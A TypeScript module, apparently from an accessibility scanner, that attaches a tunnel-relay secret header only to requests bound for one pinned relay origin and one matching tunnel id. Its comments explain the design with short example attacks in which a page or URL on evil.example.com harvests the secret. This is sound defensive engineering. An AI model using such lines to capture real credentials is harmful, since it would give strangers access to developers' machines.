/**
 * Reaching a developer's localhost from the HOSTED server, via a tunnel.
 *
 * The hosted MCP refuses private addresses and must keep doing so — its own
 * private network is our infrastructure. A tunnel does not change that: the
 * URL is an ordinary public hostname belonging to the relay, so the SSRF guard
 * passes it the way it passes any other public site.
 *
 * The only thing this file adds is the credential. The relay requires a secret
 * header on every request — the URL alone opens nothing — so the scanner has
 * to send it, and must send it to EXACTLY ONE origin.
 *
 * That last part is the whole file. Earlier in this codebase a per-site auth
 * header was attached with setExtraHTTPHeaders, which is context-wide, and it
 * leaked a customer's token to every third-party script the page loaded. A
 * scanned page can reference any host it likes; if a tunnel secret rode along
 * with those requests, one <img src="https://evil.example.com/x"> would hand
 * a stranger a live key to the developer's machine.
 */

/** The header the relay requires. Must match tunnel-relay's requestGuard. */
export const TUNNEL_SECRET_HEADER = 'x-webability-tunnel-secret'

/**
 * The ONE origin a tunnel secret may ever be sent to.
 *
 * The first version of this file derived the origin from the caller's own URL,
 * which meant `https://evil.example.com/t/<32hex>/` produced a live target and
 * every same-origin subresource on that attacker's page collected the secret.
 * The attacker knows the id because it is the path of the page they serve. A
 * credential that unlocks a developer's machine cannot be bound to a value the
 * caller chooses — it is pinned here, and overridable only by an operator
 * setting the env var on the server.
 */
export const RELAY_ORIGIN = (process.env.WEBABILITY_TUNNEL_ORIGIN || 'https://tunnel.webability.io').replace(/\/+$/, '')

export interface TunnelTarget {
  /** Origin of the relay, e.g. "https://tunnel.webability.io". */
  origin: string
  /** The 32-hex tunnel id from the path. */
  id: string
  secret: string
}

/**
 * Recognise a tunnel URL and pair it with its secret.
 *
 * Returns null for anything that is not shaped like a tunnel URL, so an
 * ordinary scan can never accidentally be treated as one.
 */
/** Is this URL on the pinned relay, shaped like a tunnel — secret or not? */
export function isTunnelUrl(rawUrl: string): boolean {
  return parseTunnelTarget(rawUrl, '-') !== null
}

export function parseTunnelTarget(rawUrl: string, secret: string): TunnelTarget | null {
  if (!secret) return null
  let url: URL
  try {
    url = new URL(rawUrl)
  } catch {
    return null
  }
  // HTTPS only. The outer SSRF check permits http, and a secret that grants
  // access to someone's laptop must not cross the network in clear text.
  if (url.protocol !== 'https:') return null
  // Pinned, not caller-derived. This single line is the difference between a
  // scoped credential and one an attacker can harvest by choosing a URL.
  if (url.origin !== RELAY_ORIGIN) return null
  const match = /^\/t\/([0-9a-f]{32})(\/|$)/.exec(url.pathname)
  if (!match) return null
  return { origin: url.origin, id: match[1], secret }
}

/**
 * Headers for ONE outgoing request.
 *
 * Empty unless the request is going to the same origin AND the same tunnel id
 * the caller named. Both halves matter: origin alone would send the secret to
 * a different developer's tunnel on the same relay.
 */
export function tunnelHeadersFor(requestUrl: string, target: TunnelTarget | null): Record<string, string> {
  if (!target) return {}
  let url: URL
  try {
    url = new URL(requestUrl)
  } catch {
    return {}
  }
  if (url.origin !== target.origin) return {}
  const match = /^\/t\/([0-9a-f]{32})(\/|$)/.exec(url.pathname)
  if (!match || match[1] !== target.id) return {}
  return { [TUNNEL_SECRET_HEADER]: target.secret }
}
